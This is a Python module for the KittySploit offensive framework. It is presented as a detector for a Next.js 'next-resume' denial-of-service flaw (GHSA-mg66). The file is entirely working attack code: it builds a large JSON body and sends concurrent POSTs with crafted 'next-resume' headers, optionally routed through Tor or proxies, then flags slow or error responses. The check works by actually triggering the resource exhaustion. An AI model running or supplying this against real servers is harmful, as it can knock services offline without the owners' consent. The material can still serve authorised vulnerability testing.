#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from concurrent.futures import ThreadPoolExecutor, as_completed

import requests

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Next.js Next-Resume DoS (GHSA-mg66) — detect",
        "description": (
            "Baseline GET then one or more POSTs with next-resume headers and a configurable MiB body; "
            "flags slow wall time or HTTP 413/500/502. Independent module."
        ),
        "author": ["KittySploit Team"],
        "severity": "high",
        "references": ["https://github.com/advisories/GHSA-mg66-mrh9-m8jx"],
        "tags": ["scanner", "http", "nextjs", "dos", "ppr"],
    }

    body_size_mb = OptInteger(5, "POST body size in MiB (smaller default for scans)", required=False)
    concurrency = OptInteger(3, "Parallel POSTs (0 uses 1)", required=False)
    post_timeout = OptInteger(90, "POST timeout (seconds)", required=False, advanced=True)
    vulnerable_wall_seconds = OptFloat(2.0, "Wall time above = positive signal", required=False, advanced=True)

    def _o(self, opt):
        if hasattr(opt, "value"):
            return opt.value
        if hasattr(opt, "__get__"):
            try:
                return opt.__get__(self, type(self))
            except Exception:
                pass
        return opt

    def _url(self):
        t, p = str(self._o(self.target) or "").strip(), int(self._o(self.port))
        proto = "https" if self._to_bool(self._o(self.ssl)) else "http"
        path = str(self.path).strip() or "/"
        if not path.startswith("/"):
            path = "/" + path
        return f"{proto}://{t}:{p}{path}"

    def _verify_proxies(self):
        verify = self._to_bool(self._o(self.verify_ssl))
        px = str(self._o(self.proxy) or "").strip()
        proxies = {}
        if px:
            proxies = {"http": px, "https": px}
        elif self.framework and getattr(self.framework, "is_tor_enabled", lambda: False)():
            tor = self.framework.tor_manager.get_tor_proxy_dict()
            if tor:
                proxies = tor
        elif self.framework and getattr(self.framework, "is_proxy_enabled", lambda: False)():
            u = self.framework.get_proxy_url()
            if u:
                proxies = {"http": u, "https": u, "all": u}
        return verify, proxies or None

    @staticmethod
    def _build_json_huge(size_mb: int) -> bytes:
        target = max(1, int(size_mb)) * 1024 * 1024
        chunk = b'"X"' + b',"X"' * 10_000
        parts = [b"[", chunk]
        size = sum(len(x) for x in parts)
        while size < target:
            parts.append(b"," + chunk)
            size += len(chunk) + 1
        parts.append(b"]")
        return b"".join(parts)

    def _resume_headers(self):
        self._configure_session()
        h = {str(k): str(v) for k, v in self.session.headers.items()}
        h.update(
            {
                "next-resume": "1",
                "x-next-resume-state-length": "1",
                "Content-Type": "text/plain",
            }
        )
        return h

    def _post_resume(self, body: bytes, timeout: float, headers: dict = None):
        verify, proxies = self._verify_proxies()
        hdr = headers if headers is not None else self._resume_headers()
        t0 = time.perf_counter()
        try:
            r = requests.post(
                self._url(),
                data=body,
                headers=hdr,
                timeout=timeout,
                verify=verify,
                proxies=proxies,
            )
            return r.status_code, time.perf_counter() - t0, None
        except requests.RequestException as e:
            return -1, time.perf_counter() - t0, str(e)

    def _baseline_get(self):
        verify, proxies = self._verify_proxies()
        try:
            self._configure_session()
            r = self.session.get(self._url(), timeout=float(self._o(self.timeout)), verify=verify, proxies=proxies)
            return r.status_code, None
        except requests.RequestException as e:
            return -1, str(e)

    def _hit(self, code: int, wall: float, err) -> bool:
        if err and "Connection" in str(err):
            return False
        thr = float(self._o(self.vulnerable_wall_seconds))
        return wall > thr or code in (413, 500, 502)

    def run(self):
        _, be = self._baseline_get()
        if be and "Connection" in str(be):
            self.set_info(reason=f"baseline: {be}")
            return False
        mb = max(1, int(self._o(self.body_size_mb)))
        conc = max(1, int(self._o(self.concurrency)))
        pto = float(self._o(self.post_timeout))
        body = self._build_json_huge(mb)
        hdr = self._resume_headers()

        hit = False
        c, w, e = self._post_resume(body, pto, hdr)
        if not (e and "Connection" in str(e)):
            hit = self._hit(c, w, e)
        if conc > 1:
            with ThreadPoolExecutor(max_workers=conc) as pool:
                futs = [pool.submit(self._post_resume, body, pto, hdr) for _ in range(conc)]
                for f in as_completed(futs):
                    c2, w2, e2 = f.result()
                    if not (e2 and "Connection" in str(e2)) and self._hit(c2, w2, e2):
                        hit = True
        if hit:
            self.set_info(reason="slow resume or 413/500/502", confidence="medium")
            return True
        self.set_info(reason="no signal", confidence="low")
        return False
